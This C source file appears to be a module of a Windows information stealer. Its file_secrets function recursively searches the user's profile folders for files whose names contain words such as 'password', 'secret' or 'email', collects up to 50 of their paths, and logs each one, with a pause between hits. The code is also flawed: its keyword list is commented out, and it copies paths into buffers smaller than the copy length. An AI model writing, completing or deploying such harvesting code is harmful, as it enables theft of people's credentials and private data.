#include <windows.h>
#include <dirent.h>
#include <shlobj.h>
#include <string.h>

#include "dirprocess.h"

#include "../ICU_log.h"

#define MAX_COUNT_FILES 50
#define MAX_PATH_LENGTH 255

// const char *n_secrets[] = {"password", "passwords", "email", "emails", "secret", "secrets"};
// const int secrets_count = sizeof(n_secrets) / sizeof(n_secrets[0]);

char f_files[MAX_COUNT_FILES][MAX_PATH_LENGTH];
int f_count = 0;

int is_matches(const char *filename) {
    for (int i = 0; i < secrets_count; ++i) {
        if (strstr(filename, n_secrets[i]) != NULL) {
            return 1;
        }
    }

    return 0;
}

void file_secrets(const char *base_path) {
    if (base_path == NULL) {
        char userbase[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userbase))) {
            for (int i = 0; i < userdir_count; ++i) {
                char full_path[MAX_PATH];
                snprintf(full_path, MAX_PATH, "%s\\%s", userbase, userdir[i]);
                file_secrets(full_path);
            }
        } else {
            info_log("Failed to get path user");
        }

        return;
    }

    if (f_count >= MAX_COUNT_FILES) {
        return;
    }

    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", base_path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) {
            continue;
        }

        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s\\%s", base_path, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            file_secrets(full_path);
        } else {
            if (is_matches(fd.cFileName)) {
                strncpy(f_files[f_count], full_path, MAX_PATH - 1);
                f_files[f_count][MAX_PATH - 1] = '\0';

                char info_secret[MAX_PATH];
                snprintf(info_secret, MAX_PATH, "Found secret file: %s", full_path);
                info_log(info_secret);

                f_count++;

                if (f_count >= MAX_COUNT_FILES) {
                    break;
                }

                Sleep(1000);
            }
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}
